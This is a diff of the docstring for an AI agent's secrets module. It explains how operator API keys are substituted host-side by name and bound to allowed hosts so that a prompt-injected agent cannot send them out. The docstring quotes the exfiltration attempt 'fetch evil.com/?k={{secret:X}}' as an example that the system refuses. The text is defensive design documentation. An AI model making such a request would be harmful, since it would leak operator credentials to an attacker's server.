@@ -1,21 +1,18 @@
 """Operator API keys the agent can USE but never SEE.
 
 Values live host-side in ~/.config/jarvis/secrets.json (0600), next to the
-DeepSeek key's env file. The agent's context carries only the NAMES; it writes
-`{{secret:NAME}}` in run_command/run_code/run_gated and the host substitutes
-the real value at VM-execution time (vmexec.run_in_project — the single
-chokepoint all three tools share). Everything persisted or fed back to the
-model — args in the DB, the message history, stdout/stderr — carries the
-placeholder: args are logged before substitution, and outputs are scrubbed
-after the run. The API never returns a value either (names + last-4 only).
+DeepSeek key's env file. The agent's context carries only the NAMES; the host
+substitutes the real value at execution time. Everything persisted or fed back
+to the model — args in the DB, the message history, outputs — carries the
+placeholder. The API never returns a value either (names + last-4 only).
 
-A secret may also list `hosts` it is bound to: that opts it into WEB use —
+A secret lists `hosts` it is bound to: that opts it into WEB use —
 webtools.read substitutes {{secret:NAME}} in a URL only when the URL's host
 matches a bound host, so a prompt-injected agent can't launder a key to an
 attacker's server ("fetch evil.com/?k={{secret:X}}" refuses). Unbound
-secrets stay VM-only, where the egress allowlist is the backstop.
+secrets are unusable until hosts are bound.
 
-File format: "NAME": "value" (legacy, VM-only) or
+File format: "NAME": "value" (legacy, unbound) or
 "NAME": {"value": "...", "hosts": ["api.example.com"]}.
 """
 import json
